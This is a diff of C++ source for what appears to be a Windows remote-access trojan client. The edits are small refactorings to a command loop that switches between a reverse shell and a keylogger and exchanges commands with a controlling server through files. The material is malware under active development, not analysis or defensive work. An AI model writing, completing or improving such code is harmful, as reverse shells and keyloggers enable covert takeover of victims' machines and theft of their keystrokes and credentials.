@@ -95,15 +95,10 @@ int main()
                             loop = false;
                             outerloop = false;
                         }
-                        else
-                        {
-                            //std::cout << "Reverse shell established." << std::endl;
-                        }
                         break;
                     }
                     case '4':                                                                                     //keylogger
                     {
-                        
                         if(receive_data("from_server.txt")[0] == '`')
                         {
                             Sleep(100);
@@ -155,8 +150,7 @@ int main()
                     }
                     default:
                     {
-                        send_data("from_server.txt","`");                                                //mark the file read(switch)
-                                               
+                        send_data("from_server.txt","`");                                                //mark the file read(switch)              
                         break;
                     }
                 }
@@ -164,6 +158,7 @@ int main()
         }
     }
 
+    FreeLibrary(hDLL);
     return 0;
 }
 
@@ -270,7 +265,7 @@ bool rev_shell()
                 processFinished.store(true);
             }
 
-            Sleep(500); // Sleep for a short time to prevent 100% CPU usage
+            Sleep(500);
         }
     });
 
@@ -282,10 +277,7 @@ bool rev_shell()
         {
             Sleep(500);
 
-            if(receive_data("from_server.txt")[0] == '`')
-            {
-                continue;
-            }
+            if(receive_data("from_server.txt")[0] == '`') continue;
             
             cmd = receive_data("from_server.txt");
             send_data("from_server.txt","`");
@@ -293,7 +285,7 @@ bool rev_shell()
             {
                 if(!send_data("from_client.txt","`"))
                 {
-                    // std::cerr << "Failed to send data to server." << std::endl;
+                    std::cerr << "[Failed to send data to server]" << std::endl;
                     loop = false; outerloop = false;
                     processFinished.store(true);
                 }
